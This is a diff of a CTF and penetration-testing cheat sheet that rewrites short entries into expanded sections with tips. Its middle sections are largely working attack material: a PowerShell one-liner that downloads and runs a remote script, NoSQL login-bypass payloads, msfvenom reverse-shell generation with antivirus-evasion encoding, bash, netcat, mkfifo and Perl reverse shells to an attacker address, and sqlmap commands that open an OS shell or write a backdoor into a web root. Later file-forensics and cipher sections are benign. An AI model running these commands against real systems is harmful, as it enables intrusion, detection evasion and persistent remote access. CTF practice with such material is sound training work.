@@ -640,26 +640,240 @@ wpscan --url http://<HOST_IP> --enumerate u
 - **Look for writable upload directories or `eval()` usage** in plugin files.
 - **Try LFI/SQLi on lesser-known plugins** if source code or version is known.
 
+---
 
-### RPC Open
+### 🛰️ RPC Open
 
-If RPC is open, we can login using rpclient.
+If port **135** (or **445** with RPC over SMB) is open, it indicates a Windows host with Remote Procedure Call (RPC) capabilities. Misconfigured RPC access can expose usernames, shares, and domain info.
 
+---
+
+#### 🔐 Anonymous RPC Login
+```bash
+rpcclient -U "" <HOST_IP>
 ```
-> $ rpcclient -U "" <HOST_IP>
+Press **Enter** when prompted for a password to attempt a null session.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Enumerate users:**
+```bash
+rpcclient <HOST_IP> -U "" -c "enumdomusers"
 ```
 
-### Powershell
-To bypass execution policy
-```
-> $ powershell.exe -exec bypass
+- **Get detailed user info:**
+```bash
+rpcclient <HOST_IP> -U "" -c "queryuser RID"
 ```
 
-### NOSql Code Injection
+- **Enumerate groups:**
+```bash
+rpcclient <HOST_IP> -U "" -c "enumdomgroups"
+```
 
+- **Find policies or domain info:**
+```bash
+rpcclient <HOST_IP> -U "" -c "getdompwinfo"
 ```
-username[$ne]=help&password[$ne]=help&login=login
+
+- **Chain with `smbclient`** to access user directories based on enum results.
+
+- **Use RID cycling to brute-force usernames:**
+```bash
+rpcclient <HOST_IP> -U "" -c "lookupsids S-1-5-21-XXXX-XXXX-XXXX-500"
 ```
+
+- **If credentials are found**, use them with `rpcclient -U user%pass <HOST>` for full access.
+
+---
+
+### 💻 PowerShell
+
+PowerShell is a powerful post-exploitation and enumeration tool on Windows machines.
+
+---
+
+#### 🚫 Bypass Execution Policy
+```bash
+powershell.exe -exec bypass
+```
+Allows execution of unsigned scripts without modifying system-wide policy.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Download and execute payloads:**
+```powershell
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/rev.ps1')"
+```
+
+- **Run encoded commands to evade detection:**
+```bash
+powershell -EncodedCommand <Base64Payload>
+```
+
+- **Use PowerView or Nishang** for enumeration, privilege escalation, and persistence.
+
+- **Use `-w hidden` to suppress PowerShell window (post-exploit):**
+```bash
+powershell -w hidden -exec bypass -File script.ps1
+```
+
+- **Enumerate system info, users, and network:**
+```powershell
+Get-LocalUser
+Get-LocalGroupMember administrators
+Get-NetIPAddress
+```
+
+---
+
+### 🧬 NoSQL Injection – Full CTF Exploitation Guide
+
+---
+
+#### 🔓 Login Bypass Payloads
+
+These exploit MongoDB’s flexible querying:
+```bash
+username[$ne]=null&password[$ne]=null
+username[$gt]=admin&password[$gt]=admin
+username[$regex]=.*&password[$regex]=.*
+username[$in][]=admin&password[$in][]=admin
+```
+
+These payloads allow login by returning `true` on any non-null or regex match.
+
+---
+
+### 🛠️ Common Injection Entry Points
+
+| Injection Vector        | Description                         |
+|-------------------------|-------------------------------------|
+| URL parameters          | `?username[$ne]=1&password[$ne]=1` |
+| Form fields (POST)      | login inputs                        |
+| JSON body (APIs)        | `{"username": {"$ne": null}}`      |
+| HTTP headers            | `X-User: {"$gt": ""}`               |
+
+---
+
+### 🧪 Blind NoSQL Injection (User Enumeration)
+
+Try brute-forcing usernames one letter at a time:
+```bash
+username[$regex]=^a&password[$ne]=x
+username[$regex]=^adm&password[$ne]=x
+```
+Check for response differences to confirm partial matches.
+
+---
+
+#### 🔍 Extract Usernames via Regex
+
+This helps discover valid users:
+```bash
+username[$regex]=^admin&password[$ne]=anything
+```
+
+---
+
+### 🧠 Extract Password Length (with `$where`)
+
+If `$where` is supported (JS injection):
+```bash
+username=admin&password[$where]=this.password.length==6
+```
+Enumerate the length first, then extract char-by-char.
+
+---
+
+### 🔁 Time-Based Injection (Timing Attacks)
+
+If errors don’t help, exploit time:
+```bash
+username=admin&password[$where]=sleep(5000)
+```
+Or for some frameworks:
+```bash
+username=admin&password[$where]=function() { sleep(5000); return true; }
+```
+If delay occurs, injection is successful.
+
+---
+
+### 🧰 Automated Tools
+
+#### 🛠️ NoSQLMap
+```bash
+git clone https://github.com/codingo/NoSQLMap
+cd NoSQLMap
+python3 nosqlmap.py
+```
+
+Use for:
+- Dumping DBs
+- Enumerating users
+- Authentication bypass
+- JS injection exploitation
+
+#### 🐍 Burp Suite + Intruder
+
+1. Intercept login POST request.
+2. Send to Intruder.
+3. Fuzz with:
+   - `[$ne]=1`
+   - `[$regex]=^a`
+   - `[$where]=...`
+
+Monitor responses for variations.
+
+---
+
+### 🔐 Privilege Escalation / Admin Hijack
+
+If user exists:
+```bash
+username=admin&password[$ne]=invalid
+```
+If login succeeds, you’ve confirmed user `admin` exists.
+
+To bypass:
+```bash
+username=admin&password[$gt]=
+```
+
+If admin panel access is via role:
+```bash
+role[$eq]=admin
+```
+
+---
+
+### 🧨 Escaping Filters
+
+Bypass weak sanitization:
+- Use array parameters: `username[$in][]`
+- Encode special characters: `%24ne`, `%24regex`
+- JSON nested injection: 
+```json
+{"user":{"$gt":""}}
+```
+
+---
+
+### 🎯 Final CTF Tips:
+
+- **Check login, search, filter, and API endpoints**—anywhere user input reaches MongoDB.
+- **Explore headers (`X-User`, `X-Auth`)** for NoSQL injection in hidden APIs.
+- **Always enumerate usernames before attempting bruteforce**.
+- **Look for JavaScript-enabled backends to exploit `$where`**.
+- **Chain NoSQLi with LFI, RCE, or misconfigured MongoDB access**.
+
+---
+
 
 ## Web Hacking
 
@@ -673,23 +887,74 @@ username[$ne]=help&password[$ne]=help&login=login
     * Covering Tracks
 ```
 
-### Enumeration and Reconnaissance Tools
+---
 
-- Whois, Nslookup, Dnsrecon, Google Fu, Dig - To passively enumerate website.
-- [Sublist3r](https://github.com/aboul3la/Sublist3r) - Subdomains enumeration tool.
-- [crt.sh](https://crt.sh) - Certificate enumeration tool.
-- [Hunter.io](https://hunter.io/) - Email enumeration tool.
-- Nmap, Wappalyzer, Whatweb, Builtwith, Netcat - Fingerprinting tools.
-- HaveIbeenPwned - Useful for breach enumeraton.
-- Use [SecurityHeaders](https://securityheaders.com/) to find some misconfigured header information on target website.
-- Use Zap Proxy tool to extract hidden files/directories.
-- Clear Text Passwords [Link](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis)
+### 🛰️ Enumeration and Reconnaissance Tools
 
-To gather information from online sources.
+Recon is critical in CTFs. Use these tools to gather intelligence before exploiting.
 
+---
+
+#### 🔎 Passive Reconnaissance
+
+- **Whois, Nslookup, Dig, Dnsrecon** – Basic DNS and domain info.
+- **Google Dorking (Google Fu)** – Discover exposed files or directories:
+  - `site:<target.com> ext:log`
+  - `intitle:index.of "backup"`
+
+---
+
+#### 🌐 Subdomain & Certificate Enumeration
+
+- [**Sublist3r**](https://github.com/aboul3la/Sublist3r) – Fast subdomain discovery:
+  ```bash
+  sublist3r -d target.com
+  ```
+- [**crt.sh**](https://crt.sh) – Public SSL certificate transparency logs.
+- [**Amass**](https://github.com/owasp-amass/amass) – Extensive subdomain and DNS enumeration.
+
+---
+
+#### 📧 Email & Breach Lookup
+
+- [**Hunter.io**](https://hunter.io) – Discover associated emails.
+- [**HaveIBeenPwned**](https://haveibeenpwned.com/) – Check email breach exposure.
+- [Clear Text Password Dataset](https://github.com/philipperemy/tensorflow-1.4-billion-password-analysis) – Build realistic password lists.
+
+---
+
+#### 🧠 Fingerprinting and Tech Stack
+
+- **Wappalyzer**, **WhatWeb**, **BuiltWith** – Identify backend tech, CMS, or frameworks.
+- **Nmap** – Version detection and port scanning.
+- **Netcat** – Basic banner grabbing or listener setup.
+
+---
+
+#### 🔐 Headers, Files, and Hidden Paths
+
+- [**SecurityHeaders**](https://securityheaders.com/) – Scan HTTP headers for misconfigurations.
+- **OWASP ZAP Proxy** – Crawl and extract hidden files or admin paths.
+- **Burp Suite** – Spider, Repeater, Intruder for thorough recon.
+
+---
+
+#### 🕵️‍♀️ Information Harvesting from Search Engines
+
+```bash
+theharvester -d microsoft.com -l 200 -g -b google
 ```
-> $ theharvester -d microsoft.com -l 200 -g -b google
-```
+- Use `-b all` for multiengine scraping.
+- Target emails, domains, subdomains, hosts, employee names.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- Always run recon in **parallel threads** (subdomains, certs, emails, etc.).
+- Use findings to create a **custom wordlist** for bruteforce (e.g., via `cewl`, `crunch`).
+- Pivot findings into active attacks — open ports, login panels, emails, and misconfigs often lead to the first foothold.
+
 
 ### Scanning
 
@@ -718,520 +983,1440 @@ To scan for UDP Ports (Dont scan all scans, as it takes lot of time).
 > $ nmap -sU -T4 <NETWORK>
 ```
 
-### Payloads
+---
 
-Non Staged Payload Example.
+### 💣 Payloads
 
-```
+Payloads are code executed on the target after exploitation. In Metasploit, they’re categorized as **Staged** and **Non-Staged**.
+
+---
+
+#### 🧱 Non-Staged Payload (Single Payload)
+```bash
 windows/meterpreter_reverse_tcp
 ```
+- Sends the **entire payload at once**.
+- Easier to detect but **simpler** to use.
+- More reliable in **unstable networks**.
 
-Staged Payload Example.
+---
 
-```
+#### 🧩 Staged Payload (Modular/Two-Step)
+```bash
 windows/meterpreter/reverse_tcp
 ```
+- Sends a **small stager first**, then downloads the full payload.
+- Smaller footprint during delivery, useful for **evading filters**.
+- **More stealthy**, but may break in flaky connections.
 
-### Shells
+---
 
-To use bind shell, we have to follow two steps: 1, Create a Bind Shell 2,Listen for connection.
-```
-> $ nc <ATTACKER_IP> <ATTACKET_PORT>` 
-```
+### 🎯 Pro Tips for CTFs:
 
-```
-> $ nc -lvp <ATTACKER_PORT>
-```
-
-If website is launching perl reverse shell, we can modify it to get better shell using Bash oneliner.
-
-```
-> $ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"<HOST_IP>:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};' 2>&1
+- Use **`msfvenom`** to generate standalone payloads:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe
 ```
 
-```
-> $ bash -c 'bash -i &> /dev/tcp/<HOST_IP>/9001 0>&1'
-```
-
-### BufferOverflow
-To generate shellcode quickly, we can use python `pwn` library.
-```
-> $ python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))
+- For web shell upload:
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
 ```
 
-```
-> $ (python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln
-```
-
-### Gobuster
-
-Normal Enumeration.
-
-```
-> $ gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
-
+- Use **`multi/handler`** in Metasploit to catch the shell:
+```bash
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <your_ip>
+set LPORT 4444
+run
 ```
 
-With Cookie (Useful to directory traversal when cookie is needed).
-```
-> $ gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -c PHPSESSID=<COOKIE_VALUE>
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://<IP_ADDRESS>
-[+] Threads:        10
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] Cookies:        <COOKIE_VALUE>
-[+] User Agent:     gobuster/3.0.1
-[+] Extensions:     php
-[+] Timeout:        10s
-===============================================================
-2020/04/19 01:43:01 Starting gobuster
-===============================================================
-/home.php (Status: 302)
-/index.php (Status: 200)
+- Encode payloads to evade AV:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -f exe > shell.exe
 ```
 
-### SQLMAP 
-Redirect the HTTP Request to Burpsuite and we can see the request like this.
+---
+
+### 🐚 Shells
+
+Shells are essential for post-exploitation access. They can be **Bind Shells** or **Reverse Shells**, depending on which side initiates the connection.
+
+---
+
+#### 🔗 Bind Shell
+
+Target listens, and attacker connects **in**.
+
+1️⃣ **On Target (create shell):**
+```bash
+nc -lvp <PORT> -e /bin/bash
+```
+
+2️⃣ **On Attacker (connect to shell):**
+```bash
+nc <TARGET_IP> <PORT>
+```
+
+---
+
+#### 🔁 Reverse Shell
+
+Attacker listens, and target connects **back**.
+
+1️⃣ **On Attacker (listen):**
+```bash
+nc -lvp 9001
+```
+
+2️⃣ **On Target (trigger shell):**
+```bash
+bash -c 'bash -i &> /dev/tcp/<ATTACKER_IP>/9001 0>&1'
+```
+
+---
+
+#### 🧪 Perl Reverse Shell (Common in CTFs)
+```bash
+perl -MIO -e '$p=fork;exit if $p;...'
+```
+- Use it when you gain command execution via web.
+- Swap in your IP and port.
+- Stable but easily detectable—upgrade shell after.
+
+---
+
+### 🧼 Shell Upgrade Tips
+
+If you get a basic shell, upgrade it:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+And make it interactive:
+```bash
+CTRL+Z
+stty raw -echo; fg
+reset
+export TERM=xterm
+```
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Always try multiple shell methods:** Bash, Python, Perl, PHP, Socat.
+- **Use `rlwrap` or `script` to wrap Netcat** for history/navigation.
+- **Some machines block Netcat**—use `socat` or `mkfifo` shell:
+```bash
+mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
+```
+
+- **Check cron jobs or file uploads for persistence** using reverse shells.
+
+
+---
+
+### 💥 Buffer Overflow
+
+Buffer overflow exploits can be used to execute arbitrary code, often giving shell access. One key step is injecting shellcode into the program's memory.
+
+---
+
+#### 🛠️ Generate Shellcode with `pwntools` (Python)
+
+Quick shellcode to spawn `/bin/sh`:
+```bash
+python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))"
+```
+
+---
+
+#### 🔁 Pipe Shellcode into Vulnerable Binary
+```bash
+(python -c "import pwn; print(pwn.asm(pwn.shellcraft.linux.sh()))"; cat) | ./vuln
+```
+
+- Combines shellcode and standard input to exploit buffer in real time.
+- `cat` keeps the session alive after payload injection.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Set architecture** for shellcode:
+```python
+context.arch = 'amd64'  # or 'i386'
+```
+
+- **Debug with GDB:**
+```bash
+gdb ./vuln
+```
+
+- **Use pattern generation to find offset:**
+```bash
+pwn cyclic 100
+pwn cyclic -l <crash_value>
+```
+
+- **Attach `pwntools` debugger**:
+```python
+p = gdb.debug("./vuln", gdbscript="b *main\ncontinue")
+```
+
+- **Use `ROPgadget` to find useful instructions** for ret2libc or ROP chaining.
+
+---
+
+### 🚪 Gobuster – Directory & File Enumeration
+
+Gobuster is a fast, flexible tool used to brute-force directories, files, and virtual hosts on web servers—critical for discovering hidden content during CTFs.
+
+---
+
+#### 🔍 Basic Directory Enumeration
+```bash
+gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+- Use default extensions or combine with `-x php,txt,bak` for better results.
+
+---
+
+#### 🍪 With Cookies (Authenticated Enumeration)
+```bash
+gobuster dir -u http://<IP_ADDRESS> \
+-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+-x php -c PHPSESSID=<COOKIE_VALUE>
+```
+- Useful when login is required or access is session-based.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Target file extensions**:
+```bash
+-x php,html,txt,bak,zip
+```
+
+- **Change status code filters** to include redirects, forbidden, etc.:
+```bash
+--status-codes 200,204,301,302,307,401,403
+```
+
+- **Recursive brute-force** (manually explore found directories).
+- **Use smaller wordlists for initial scan**, then refine:
+  - `/usr/share/wordlists/dirb/common.txt`
+  - `/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt`
+
+- **Add user-agent to evade simple WAFs:**
+```bash
+--user-agent "Mozilla/5.0"
+```
+
+- **Scan HTTPS URLs** with `-k` to ignore SSL validation (CTFs often use self-signed certs):
+```bash
+gobuster dir -k -u https://<IP_ADDRESS> -w ...
+```
+
+- **Don't miss hidden admin or upload portals** like:
+  - `/admin`, `/upload`, `/debug`, `/backup`
+
+
+---
+
+### 🧬 SQLMap – SQL Injection Automation
+
+SQLMap automates the detection and exploitation of SQL injection flaws. In CTFs, it’s a fast way to extract databases, users, tables, and even get shells.
+
+---
+
+#### 🔁 Capturing HTTP Request via Burp Suite
+
+1. Intercept a vulnerable POST request:
 ```
 POST / HTTP/1.1
 Host: <IP_ADDRESS>
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://<IP_ADDRESS>/
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 11
-Connection: close
-Upgrade-Insecure-Requests: 1
-
+...
 search=help
 ```
-Now Right click and click on `copy to file` option.
+
+2. **Right-click → Save to File** (e.g., `search.req`)
+
+---
+
+#### 🚀 Running SQLMap on the Captured Request
+
+```bash
+sqlmap -r search.req --batch --force-ssl
 ```
-> $ sqlmap -r search.req --batch --force-ssl
-        ___
-       __H__
- ___ ___[,]_____ ___ ___  {1.4.3#stable}
-|_ -| . ["]     | .'| . |
-|___|_  [.]_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
+- `-r`: Use raw HTTP request file.
+- `--batch`: Run without interactive prompts.
+- `--force-ssl`: Useful for HTTPS endpoints.
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+---
 
-[*] starting @ 01:25:16 /2020-04-19/
+### 🎯 Pro Tips for CTFs:
 
-[01:25:16] [INFO] parsing HTTP request from 'search.req'
-[01:25:17] [INFO] testing connection to the target URL
-[01:25:17] [INFO] checking if the target is protected by some kind of WAF/IPS
-[01:25:17] [INFO] testing if the target URL content is stable
-[01:25:18] [INFO] target URL content is stable
-[01:25:18] [INFO] testing if POST parameter 'search' is dynamic
-[01:25:18] [WARNING] POST parameter 'search' does not appear to be dynamic
-[01:25:18] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
-[01:25:19] [INFO] testing for SQL injection on POST parameter 'search'
-[01:25:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[01:25:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[01:25:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
-[01:25:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+- **Extract full DB structure:**
+```bash
+sqlmap -r search.req --dbs
+sqlmap -r search.req -D <db_name> --tables
+sqlmap -r search.req -D <db_name> -T <table_name> --dump
 ```
+
+- **Enumerate current DB, user, and version:**
+```bash
+sqlmap -r search.req --current-db
+sqlmap -r search.req --current-user
+sqlmap -r search.req --banner
+```
+
+- **OS Shell or File Write:**
+```bash
+sqlmap -r search.req --os-shell
+sqlmap -r search.req --file-write=backdoor.php --file-dest=/var/www/html/backdoor.php
+```
+
+- **Test specific parameter (if request has multiple):**
+```bash
+sqlmap -r search.req -p search
+```
+
+- **Bypass WAFs:**
+```bash
+--tamper=space2comment,randomcase
+```
+
+- **Use cookies (if session required):**
+```bash
+sqlmap -r search.req --cookie="PHPSESSID=<COOKIE>"
+```
+
+- **Avoid IDS detection:**
+```bash
+--random-agent --delay=1 --threads=1
+```
+
+---
 
 
 ## File Hacking
 
-### Extract hidden text from PDF Files
+---
 
-If something is hidden on a pdf which we need to find, we can Press `Ctrl + A` to copy everything on the pdf and paste on notepad.
-If nothing is found, we can use [Inkspace tool](https://inkscape.org) to paste the pdf and try to ungroup several times to extract any hidden flag.
-Else solve using pdf-uncompress tools like `qpdf` to convert compressed data to redeable format.
+### 📄 Extract Hidden Text from PDF Files
 
-### Compress File Extraction
+PDFs in CTFs often hide flags using layers, compression, white text, or embedded objects.
 
-If there is `PK` at the start of the file in the magic bytes, its most probably `ZIP` File.
+---
 
-To extract data from recursive zip file.
+#### 🖱️ Manual Extraction (Quick Try)
 
+1. **Open PDF → Ctrl + A → Ctrl + C**
+2. **Paste into Notepad** or any plain text editor.
+
+> ✅ Works if text is layered or colored white.
+
+---
+
+#### 🎨 Use Inkscape (For Embedded/Layered Flags)
+
+1. Open PDF in [**Inkscape**](https://inkscape.org)
+2. Repeatedly click **"Ungroup"** (`Shift + Ctrl + G`)
+3. Look for:
+   - White-on-white text
+   - Hidden objects or overlays
+   - Off-canvas data
+
+> Great for **vector-based or image-embedded flags**.
+
+---
+
+#### 🔧 Decompress PDF with `qpdf`
+
+```bash
+qpdf --qdf --object-streams=disable input.pdf output_uncompressed.pdf
 ```
-> $ binwalk -Me <FILE_NAME>
+
+- Converts PDF streams into readable text.
+- Open with a text editor and search for `flag`, `HTB`, `CTF{`, etc.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Search hex editors** for embedded strings:
+```bash
+strings file.pdf | grep -i flag
 ```
 
-### Extract hidden strings
-
-If file is having some hidden text, we can use `hexeditor` or `strings` commands to locate the flag.
-
-If hidden text has == at the end, it is `base64` encoded.
-
-To monitor the appplication calls of a binary.
-
-```
-> $ strace -s -f 12345 -e trace=recv,read <PROGRAM>
+- **Use `pdf-parser.py`** (by Didier Stevens) to inspect PDF objects:
+```bash
+pdf-parser.py input.pdf
 ```
 
-To track all Application & library calls of a program.
+- **Try `binwalk`** if the PDF is embedded with other files:
+```bash
+binwalk input.pdf
+```
 
+- **Look for invisible/hidden layers in GIMP or Photoshop** if it's image-heavy.
+
+- **Use OCR (`tesseract`)** if text is embedded inside images:
+```bash
+tesseract image.png stdout
 ```
-> $ ltrace ./<PROG_NAME>
+
+
+---
+
+### 📦 Compressed File Extraction
+
+In CTFs, compressed files may hide flags deeply nested or disguised using alternate extensions or embedded formats.
+
+---
+
+#### 🔍 Identify File Type (Magic Bytes)
+
+Check the file header:
+```bash
+xxd <FILE_NAME> | head
 ```
+- If it starts with `50 4B` (`PK`), it’s likely a **ZIP** file, even if the extension is misleading.
+
+---
+
+#### 🧨 Extract Recursively with `binwalk`
+
+```bash
+binwalk -Me <FILE_NAME>
+```
+- `-M`: Enables recursive extraction of embedded files.
+- `-e`: Automatically extracts known file types.
+- Saves output in `_FILE_NAME.extracted/`.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Use `file` command to confirm type:**
+```bash
+file <FILE_NAME>
+```
+
+- **Manually unzip if standard ZIP:**
+```bash
+unzip <FILE_NAME>
+```
+
+- **Use `7z` for unknown or nested formats:**
+```bash
+7z x <FILE_NAME>
+```
+
+- **Inspect for password-protected archives inside:**
+  - Use `fcrackzip` or `john` to brute-force:
+```bash
+fcrackzip -v -u -D -p wordlist.txt protected.zip
+```
+
+- **Sometimes `.jpg`, `.png`, or `.docx` hide zips internally. Use `binwalk` or `steghide` to detect.**
+
+- **Loop unzipper for nested zips:**
+```bash
+while file *.zip | grep -q 'Zip archive'; do for f in *.zip; do unzip "$f" -d "${f}_unzipped"; done; cd *_unzipped; done
+```
+
+
+---
+
+### 🧵 Extract Hidden Strings
+
+CTF files often hide flags in binary, encoded, or obfuscated forms. Use basic Linux tools for deep inspection.
+
+---
+
+#### 🔍 View Embedded or Encoded Text
+
+**Use `strings` to extract ASCII-readable data:**
+```bash
+strings <FILE> | grep -i flag
+```
+
+**Use `hexeditor` to manually inspect binary layout:**
+```bash
+hexeditor <FILE>
+```
+
+- Look for readable data, base64 patterns, and unexpected headers.
+- Look for clues like `flag{...}`, `HTB{...}`, or even **Unicode-encoded** text.
+
+---
+
+#### 🔐 Detect Base64 (Common in CTFs)
+
+If you see patterns like:
+```bash
+U2FsdGVkX1+VZmxhZ3s0aGFja2VkX2ZsYWd9==
+```
+The `==` ending suggests **base64 encoding**:
+```bash
+echo 'U2FsdGVk...' | base64 -d
+```
+
+---
+
+### 📡 Runtime Tracing (Dynamic Analysis)
+
+#### 🧩 Monitor Syscalls with `strace`:
+```bash
+strace -s 9999 -f -e trace=recv,read ./<PROGRAM>
+```
+- `-f`: Follow child processes.
+- `-s`: Increase string capture size (default is 32).
+- Watch for runtime flag output or hidden read events.
+
+#### 🧬 Track Function Calls with `ltrace`:
+```bash
+ltrace ./<PROGRAM>
+```
+- Reveals **dynamic library calls**, useful for uncovering:
+  - Password checks
+  - String comparisons
+  - File reads
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Try XOR decoding** if text looks binary but consistent:
+```bash
+xxd -p file | tr -d '\n' | xxd -r -p | xor_tool
+```
+
+- **Use Ghidra or GDB** to trace logic if strings are encrypted or manipulated in memory.
+
+- **Combine `strace` with `tee` or `grep`** to live-watch extracted data.
+
+- **Check for Unicode, ROT13, or hex-encoded flags** if base64 doesn’t reveal useful output.
+
 
 ## Cryptography
 
-### Caesar Cipher 
+---
 
-If there is word `caesar` in the question or hint, it can be a substitution cipher.
+### 🔐 Caesar Cipher
 
-If you find `!` in the cipher text and cipher seems to be within certain range of Letters and appears to be transposition of a plain text, Use this website [Ceasar Box](https://www.dcode.fr/caesar-box-cipher) to Bruteforce the hidden message.
+A **Caesar cipher** is a simple substitution cipher where each letter is shifted by a fixed number in the alphabet.
 
-### Vigenere Cipher
+---
 
-To break Vigenere ciphers without knowing the key.
-- Use this website [Link](https://www.guballa.de/vigenere-solver) - Bruteforce solver.
+#### 🧭 Classic Caesar Decryption
 
-### One Time Pad Cipher
-To solve One Time Pad, Use [OTP](http://rumkin.com/tools/cipher/otp.php).
+If the challenge mentions **"caesar"**, it’s likely using a basic shift cipher.
 
-
+- Try all 25 shifts manually:
+```bash
+for i in {1..25}; do echo "ciphertext" | tr 'A-Za-z' "$(echo {A..Z} | sed -E "s/(.{$i})(.*)/\2\1/")$(echo {a..z} | sed -E "s/(.{$i})(.*)/\2\1/")"; done
 ```
-> $ /usr/share/john/ssh2john.py id_rsa > output.hash
+
+Or use [**dCode Caesar Solver**](https://www.dcode.fr/caesar-cipher).
+
+---
+
+#### 🧱 Caesar Box Cipher
+
+If ciphertext contains characters like `!` or appears block-like:
+- Likely a **Caesar Box (Columnar Transposition)** cipher.
+
+Use:
+👉 [**Caesar Box Solver**](https://www.dcode.fr/caesar-box-cipher)
+
+Paste text and bruteforce dimensions or square sizes.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Look for clue words**: "shift", "rotate", "move", "Julius", or "Rome".
+- **If numeric hints (like 3 or 13) are given**, use them as shift values.
+- **Try reverse shift (ROT13 or ROT-N)** using:
+```bash
+echo "ciphertext" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 ```
+
+- Combine Caesar decoding with base64 or hex if multiple layers are used.
+
+---
+
+### 🧩 Vigenère Cipher
+
+The **Vigenère cipher** is a polyalphabetic substitution cipher that uses a repeating key to shift letters.
+
+---
+
+#### 🔓 Crack Without Knowing the Key
+
+Use this online bruteforce solver:
+👉 [**Guballa Vigenère Solver**](https://www.guballa.de/vigenere-solver)
+
+- Paste the ciphertext and let it auto-detect the key length and content.
+- It uses frequency analysis and Kasiski examination behind the scenes.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **Clues like "key", "password", "repeating", or "polyalphabetic"** often indicate Vigenère.
+- Try **common keys** like:
+  - `flag`, `ctf`, `security`, `secret`, `pass`
+- If a **partial plaintext or known word is visible**, use a **known-plaintext attack**.
+
+- If ciphertext is **all caps with no spaces**, suspect Vigenère or Playfair.
+
+- **Layered encoding** (e.g., base64 → Vigenère → Caesar) is common—decode in reverse.
+
+
+---
+
+### 🗝️ One-Time Pad (OTP) Cipher
+
+The **One-Time Pad** is an unbreakable cipher when used properly (random key, used once, same length as plaintext). In CTFs, it's often improperly implemented—making it crackable.
+
+---
+
+#### 🔓 Solve OTP Easily
+
+Use this online tool:
+👉 [**OTP Decryption Tool**](http://rumkin.com/tools/cipher/otp.php)
+
+- Input the **ciphertext** and **key** (or guess/bruteforce if reused or predictable).
+- Decryption is done via XOR of ciphertext and key.
+
+---
+
+### 🧠 CTF Use Case: SSH Private Key Cracking
+
+If OTP is a red herring and you find an `id_rsa` file, use `john` to crack it:
+
+```bash
+/usr/share/john/ssh2john.py id_rsa > output.hash
+john output.hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+> ✅ Often used to escalate after retrieving a user's private key in challenges.
+
+---
+
+### 🎯 Pro Tips for CTFs:
+
+- **OTP ciphertext and key must be same length** — verify before decoding.
+- If a reused key is suspected, treat it like a **Vigenère with XOR**.
+- **Use hex editors or `xxd`** to identify XOR patterns in binary OTP files.
+- Check if the key is:
+  - Hardcoded in source
+  - Found in another file
+  - Same as part of the flag
+
 
 ## Forensics
 
-### Image File
+---
 
-Try `file` comamnd on the image to learn more information.
+### 🖼️ Image File Analysis
 
-To extract data inside Image files.
+Images often hide flags using steganography, metadata, or embedded file structures.
 
+---
+
+#### 📄 Identify Image File Type
+
+```bash
+file <FILE_NAME>
 ```
-> $ zsteg <FILE_NAME>
-```
+- Confirms true file type regardless of extension (e.g., PNG renamed to JPG).
 
-To check for metadata of the Image files.
+---
 
-```
-> $ exiftool <FILE_NAME>
-```
+#### 🧬 Metadata Analysis
 
-To search for particular string or flag in an Image file.
-
+```bash
+exiftool <FILE_NAME>
 ```
